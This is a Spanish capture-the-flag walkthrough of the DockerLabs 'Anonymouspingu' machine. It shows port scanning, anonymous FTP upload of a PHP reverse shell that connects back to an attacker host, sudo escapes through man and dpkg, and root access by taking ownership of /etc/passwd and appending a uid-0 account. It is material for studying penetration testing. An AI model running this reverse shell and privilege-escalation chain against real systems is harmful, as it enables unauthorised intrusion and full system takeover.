---
icon: flag
---

# Anonymouspingu DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip anonymouspingu.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh anonymouspingu.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-15 12:30 EST
Nmap scan report for express.dl (172.17.0.2)
Host is up (0.000028s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0            7816 Nov 25  2019 about.html
| -rw-r--r--    1 0        0            8102 Nov 25  2019 contact.html
| drwxr-xr-x    2 0        0            4096 Jan 01  1970 css
| drwxr-xr-x    2 0        0            4096 Apr 28  2024 heustonn-html
| drwxr-xr-x    2 0        0            4096 Oct 23  2019 images
| -rw-r--r--    1 0        0           20162 Apr 28  2024 index.html
| drwxr-xr-x    2 0        0            4096 Oct 23  2019 js
| -rw-r--r--    1 0        0            9808 Nov 25  2019 service.html
|_drwxrwxrwx    1 33       33           4096 Apr 28  2024 upload [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Mantenimiento
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.29 seconds
```

Si entramos en la pagina del puerto `80` vemos una pagina normal y corriente, por lo que haremos un poco de `fuzzing`:

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k -r 
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/about.html           (Status: 200) [Size: 7816]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess.html       (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/contact.html         (Status: 200) [Size: 8102]
/css                  (Status: 200) [Size: 1744]
/images               (Status: 200) [Size: 5993]
/index.html           (Status: 200) [Size: 20162]
/js                   (Status: 200) [Size: 1149]
/server-status        (Status: 403) [Size: 275]
/service.html         (Status: 200) [Size: 9808]
/upload               (Status: 200) [Size: 739]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que hay una carpeta de `upload/` bastante interesante y el `FTP` vamos a probar si se puede entrar como `anonymous`.

## FTP

```shell
ftp anonymous@<IP>
```

Y veremos que si nos deja, si listamos vemos lo siguiente:

```shell
ls
```

Info:

```
229 Entering Extended Passive Mode (|||23034|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            7816 Nov 25  2019 about.html
-rw-r--r--    1 0        0            8102 Nov 25  2019 contact.html
drwxr-xr-x    2 0        0            4096 Jan 01  1970 css
drwxr-xr-x    2 0        0            4096 Apr 28  2024 heustonn-html
drwxr-xr-x    2 0        0            4096 Oct 23  2019 images
-rw-r--r--    1 0        0           20162 Apr 28  2024 index.html
drwxr-xr-x    2 0        0            4096 Oct 23  2019 js
-rw-r--r--    1 0        0            9808 Nov 25  2019 service.html
drwxrwxrwx    1 33       33           4096 Apr 28  2024 upload
226 Directory send OK.
```

Vemos que el `ftp` esta dentro de la pagina, por lo que podremos probar a subir un `.php` desde el `ftp` para crearnos una `reverse shell` de la siguiente forma:

## Escalate user www-data

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Una vez creado el archivo lo subiremos desde `ftp` de la siguiente forma:

```shell
cd upload/
put shell.php
```

Info:

```
local: shell.php remote: shell.php
229 Entering Extended Passive Mode (|||21819|)
150 Ok to send data.
100% |****************************************************************************************************************|   116        1.15 MiB/s    00:00 ETA
226 Transfer complete.
116 bytes sent in 00:00 (261.61 KiB/s)
```

Ahora si nos vamos a la pagina en la seccion de `upload`

```
URL = http://<IP>/upload/
```

Veremos el archivo de `shell.php`, por lo que nos pondremos antes a la escucha:

```shell
nc -lvnp <PORT>
```

Y si pinchamos el archivo de la web y volvemos a la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.120.128] from (UNKNOWN) [172.17.0.2] 51042
whoami
www-data
```

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user pingu

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on 71405f43252f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on 71405f43252f:
    (pingu) NOPASSWD: /usr/bin/man
```

Vemos que podemos ejecutar el binario `man` como el usuario `pingu`, por lo que haremos lo siguiente:

```shell
sudo -u pingu man man
!/bin/bash
```

Y con esto seremos el usuario `pingu`.

## Escalate user gladys

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for pingu on 71405f43252f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User pingu may run the following commands on 71405f43252f:
    (gladys) NOPASSWD: /usr/bin/nmap
    (gladys) NOPASSWD: /usr/bin/dpkg
```

Vemos que podemos ejecutar los binarios `nmap` y `dpkg` como el usuario `gladys` por lo que haremos lo siguiente:

```shell
sudo -u gladys dpkg -l
!/bin/bash
```

Y con esto veremos que somos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for gladys on 71405f43252f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User gladys may run the following commands on 71405f43252f:
    (root) NOPASSWD: /usr/bin/chown
```

Veremos que podemos ejecutar el binario `chown` como el usuario `root`, por lo que haremos lo siguiente:

```shell
openssl passwd "1234"
```

Info:

```
$1$NxevQ9gO$Ia4JXYw9vwiqWG8bfjyCm1
```

```shell
sudo chown gladys:gladys /etc/passwd
echo "fake:$1$NxevQ9gO$Ia4JXYw9vwiqWG8bfjyCm1:0:0::/home/fake:/bin/bash" >> /etc/passwd
```

Y si hacemos lo siguiente:

```shell
su fake
```

Metemos como contraseña `1234` y veremos que somo `root` por lo que habremos terminado la maquina.
